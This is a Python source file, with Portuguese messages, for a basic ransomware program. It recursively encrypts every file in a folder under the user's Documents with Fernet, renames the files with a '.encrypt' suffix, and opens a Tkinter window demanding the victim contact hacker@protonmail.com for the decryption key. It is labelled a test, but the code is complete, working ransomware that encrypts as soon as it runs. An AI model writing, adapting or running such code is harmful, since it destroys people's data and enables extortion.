import os
from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk

ACCOUNT_EMAIL = 'hacker@protonmail.com'
ENCRYPTED_FILEFORMAT = '.encrypt'
EXCEPTION_FILE_LIST = [ENCRYPTED_FILEFORMAT,'main','mykey.key','.ico']

if os.path.isfile('mykey.key'):
    key = open('mykey.key','r').read().encode()
    print('[+] Reaproveitado chave existente')
else:
    key = Fernet.generate_key()
    print('[+] Gerado nova chave')

encryption_start_path = os.path.expanduser('~') + "\\Documents\\secreto"

def decrypt(filepath, decryption_key):
    fernet = Fernet(decryption_key)
    if not filepath:
        return '[-] Nenhum caminho especificado'
    with open(filepath, 'rb') as encrypted_file:
        encrypted_file_data = encrypted_file.read()

    decrypted = fernet.decrypt(encrypted_file_data)

    with open(filepath[:-(len(ENCRYPTED_FILEFORMAT))], 'wb') as decrypted_file:
        decrypted_file.write(decrypted)
    
    return f'[+] Decriptado arquivo do caminho {filepath} com a chave {decryption_key}!'

def decrypt_all_files(filepath=encryption_start_path, decryption_key=False):
    if not txtDecryptKey:
        decryption_key = open('mykey.key','r').read().encode()
    for path, subfolder, files in os.walk(encryption_start_path):
        for filename in files:
            decrypt_filepath = path + '\\' + filename
            decrypt_this = True
            
            if ENCRYPTED_FILEFORMAT in decrypt_filepath:
                print(decrypt(decrypt_filepath, decryption_key))
            else:
                print(f'[-] Arquivo {decrypt_filepath} não será decriptado!')

def encrypt(encrypt_pathfile, key):
    try:
        # Salvando chages
        with open('mykey.key', 'w') as fwrite:
            fwrite.write(key.decode('utf-8'))
        # Iniciando criptografia
        fernet = Fernet(key)
        with open(encrypt_pathfile, 'rb') as original_file:
            encrypted = fernet.encrypt(original_file.read())
        with open(encrypt_pathfile, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
        os.rename(encrypt_pathfile, encrypt_pathfile+ENCRYPTED_FILEFORMAT)
        
        return f'[+] Encriptado a pasta do caminho {encrypt_pathfile} com a chave {key}!'
    except Exception as e:
        print(e)
        return f'[-] Ocorreu um erro ao criptografar {encrypt_pathfile}!'

for path, subfolder, files in os.walk(encryption_start_path):
    for filename in files:
        filepath = path + '\\' + filename
        encrypt_this = True
        for exception_file in EXCEPTION_FILE_LIST:
            if exception_file in filepath: 
                encrypt_this = False
                break
        
        if encrypt_this:
            print(encrypt(filepath, key))
        else:
            print(f'[-] Arquivo {filepath} não será criptografado!')



window = Tk()
window.title("Ransomware Teste Alerta")
window.geometry('500x100')
window.configure(background = "grey")
lblInicial = Label(window, text=f"Oops, seus arquivos foram encriptados.\nPara adquirir a chave de decriptar, entrar em contato com {ACCOUNT_EMAIL}.").pack()

typed_decryptkey = StringVar()
txtDecryptKey = Entry(window, textvariable=typed_decryptkey).pack()
btnDecrypt = ttk.Button(window, text="Decriptar!",
    command=decrypt_all_files).pack()
window.mainloop()
